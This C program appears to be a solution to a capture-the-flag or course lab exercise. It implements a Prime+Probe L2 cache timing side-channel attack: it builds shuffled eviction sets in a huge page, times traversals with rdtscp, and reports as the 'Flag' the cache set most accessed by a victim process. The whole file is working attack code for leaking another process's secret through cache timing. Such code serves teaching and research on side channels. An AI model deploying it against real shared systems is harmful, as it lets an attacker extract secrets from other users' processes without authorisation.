#include "util.h"
#include <sys/mman.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define BUFF_SIZE (1<<21)
#define L2_WAYS 16
#ifndef STRIDE
#define STRIDE (1<<16)
#endif

// Inline rdtscp for timing
static inline uint64_t rdtscp(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

// Linked list node
struct node {
    struct node *next;
    char pad[64 - sizeof(struct node *)]; // Pad to cache line size
};

void *buf;
struct node *current_set_head;

// Shuffle an array of pointers
void shuffle(struct node **array, int n) {
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        struct node *temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
}

// Build shuffled linked list for a set
void build_set(int set_index) {
    char *base = (char *)buf;
    struct node *nodes[L2_WAYS];
    
    for (int i = 0; i < L2_WAYS; i++) {
        nodes[i] = (struct node *)(base + set_index * 64 + i * STRIDE);
    }
    
    shuffle(nodes, L2_WAYS);
    
    for (int i = 0; i < L2_WAYS - 1; i++) {
        nodes[i]->next = nodes[i+1];
    }
    nodes[L2_WAYS-1]->next = NULL;
    
    current_set_head = nodes[0];
}

// Prime the current set
void prime_set() {
    struct node *curr = current_set_head;
    while (curr) {
        curr = curr->next;
    }
}

// Probe the current set and return the access time
uint64_t probe_set() {
    uint64_t start = rdtscp();
    struct node *curr = current_set_head;
    while (curr) {
        curr = curr->next;
    }
    uint64_t end = rdtscp();
    return end - start;
}

int main(int argc, char const *argv[]) {
    srand(time(NULL));

    // Allocate huge page
    buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (buf == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    
    *((char *)buf) = 1; // dummy write

    int flag = -1;
    uint64_t max_latency = 0;
    
    // We can repeat the scan multiple times to be sure
    // Or just scan once with enough samples.
    // Let's do one pass first.
    
    // printf("Scanning L2 sets...\n");

    for (int i = 0; i < 1024; i++) {
        build_set(i);
        
        uint64_t total_latency = 0;
        int samples = 200; // Increase samples for better signal-to-noise
        
        for (int k = 0; k < samples; k++) {
            prime_set();
            // Wait a bit for victim to access
            // Victim loop is tight, so short wait is fine.
            for(volatile int w=0; w<500; w++);
            total_latency += probe_set();
        }
        
        uint64_t avg_latency = total_latency / samples;
        
        // Debug print
        // if (avg_latency > 300) {
        //     printf("Set %d: %llu\n", i, (unsigned long long)avg_latency);
        // }

        if (avg_latency > max_latency) {
            max_latency = avg_latency;
            flag = i;
        }
    }

    printf("Flag: %d\n", flag);
    return 0;
}
